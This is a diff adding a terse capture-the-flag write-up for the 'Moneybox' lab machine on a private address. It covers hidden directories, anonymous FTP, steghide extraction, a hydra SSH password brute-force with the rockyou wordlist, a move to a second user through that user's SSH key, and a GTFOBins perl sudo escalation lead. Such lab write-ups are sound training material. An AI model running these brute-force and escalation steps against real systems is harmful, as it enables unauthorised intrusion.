@@ -1,0 +1,34 @@
+Write up for Moneybox
+
+192.168.x.x
+
+http://192.168.56.109/blogs/
+Check page source and got
+S3cr3t-T3xt
+
+http://192.168.56.109/S3cr3t-T3xt/
+3xtr4ctd4t4
+connect ftp 
+using anonymous:3xtr4ctd4t4
+After checking the directory I found 
+trytofind.jpg
+get trytofind.jpg
+
+steghide extract -sf trytofind.jpg
+cat data.txt
+got user name renu
+
+Try to crack ssh password
+
+hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.56.109 ssh -t 4
+Got password for renu 
+login ssh
+sudo -l
+cat flag1.txt
+ls /home
+found another user lily
+check lily's /home 
+I found .ssh/authorized key is there move in this directory 
+ssh lily@192.168.x.x
+sudo -l
+check for perl https://gtfobins.github.io/gtfobins/perl/#sudo
